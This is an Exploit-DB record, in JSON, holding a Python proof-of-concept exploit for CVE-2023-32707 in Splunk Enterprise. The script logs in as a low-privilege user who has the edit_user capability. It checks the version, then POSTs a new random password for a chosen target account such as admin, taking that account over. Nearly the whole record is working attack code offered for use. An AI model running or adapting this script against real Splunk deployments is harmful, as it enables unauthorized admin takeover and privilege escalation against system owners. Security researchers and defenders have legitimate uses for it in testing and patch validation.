{"source": "https://www.exploit-db.com/exploits/51747", "vulnName": "Splunk 9.0.5 - admin account take over", "vulnEDBID": "51747", "vulnCVE": "2023-32707", "author": "REDWAY SECURITY", "exploitType": "WEBAPPS", "platform": "MULTIPLE", "datePublished": "2023-10-09", "vulnContent": "#!/usr/bin/env python3\n#\n# Exploit Title: Splunk 9.0.5 - admin account take over\n# Author: [Redway Security](https://twitter.com/redwaysec))\n# Discovery: [Santiago Lopez](https://twitter.com/santi_lopezz99)\n\n#CVE: CVE-2023-32707\n\n# Vendor Description: A low-privilege user who holds a role that has the `edit_user` capability assigned\n# to it can escalate their privileges to that of the admin user by providing specially crafted web requests.\n#\n# Versions Affected: Splunk Enterprise **below** 9.0.5, 8.2.11, and 8.1.14.\n#\nimport argparse\nimport requests\nimport random\nimport string\nimport base64\n# ignore warnings\nimport urllib3\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n# Parse command-line arguments\nparser = argparse.ArgumentParser(description='Splunk Authentication')\nparser.add_argument('--host', required=True, help='Splunk host or IP address')\nparser.add_argument('--username', required=True, help='Splunk username')\nparser.add_argument('--password', required=True, help='Splunk password')\nparser.add_argument('--target-user', required=True, help='Target user')\nparser.add_argument('--force-exploit', action='store_true',\nhelp='Force exploit')\n\nargs = parser.parse_args()\n\n# Splunk server settings\nsplunk_host = args.host.split(':')[0]\nsplunk_username = args.username\nsplunk_password = args.password\ntarget_user = args.target_user\nforce_exploit = args.force_exploit\n\nsplunk_port = args.host.split(':')[1] if len(args.host.split(':')) > 1 else 8089\nuser_endpoint = f\"https://{splunk_host}:{splunk_port}/services/authentication/users\"\n\ncredentials = f\"{splunk_username}:{splunk_password}\"\nbase64_credentials = base64.b64encode(credentials.encode()).decode()\nheaders = {\n'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0',\n'Authorization': f'Basic {base64_credentials}'\n\n}\nproxies = {\n# 'http': '[http://127.0.0.1:8080'](<a href=),\">http://127.0.0.1:8080',\n# 'https': 'http://127.0.0.1:8080'\n}\n\nresponse = requests.get(f\"{user_endpoint}/{splunk_username}?output_mode=json\",\nheaders=headers, proxies=proxies, verify=False)\n\nif response.status_code == 200:\naffected_versions = ['9.0.4', '8.2.10', '8.1.13']\nuser = response.json()\nsplunk_version = user['generator']['version']\n# This is not a good way to compare versions.\n# There is a range of versions that are affected by this CVE, but this is just a PoC\n# 8.1.0 to 8.1.13\n# 8.2.0 to 8.2.10\n# 9.0.0 to 9.0.4\nprint(f\"Detected Splunk version '{splunk_version}'\")\nif any(splunk_version <= value for value in affected_versions) or force_exploit:\nuser_capabilities = user['entry'][0]['content']['capabilities']\nif 'edit_user' in user_capabilities:\nprint(\nf\"User '{splunk_username}' has the 'edit_user' capability, which would make this target exploitable.\")\nnew_password = ''.join(random.choice(\nstring.ascii_letters + string.digits) for _ in range(8))\nchange_password_payload = {\n'password': new_password,\n'force-change-pass': 0,\n'locked-out': 0\n}\nresponse = requests.post(f\"{user_endpoint}/{target_user}?output_mode=json\",\ndata=change_password_payload, headers=headers, proxies=proxies, verify=False)\nif response.status_code == 200:\nprint(\nf\"Successfully taken over user '{target_user}', log into Splunk with the password '{new_password}'\")\nelse:\nprint('Account takeover failed')\nelse:\nprint(\nf\"User '{splunk_username}' does not have the 'edit_user' capability, which makes this target not exploitable by this user.\")\nelse:\nprint(f\"Splunk version '{splunk_version}' is not affected by CVE-2023-32707\")\nelse:\nprint(\nf\"Couldn't authenticate to Splunk server '{splunk_host}' with user '{splunk_username}' and password '{splunk_password}'\")\nexit(1)\n            "}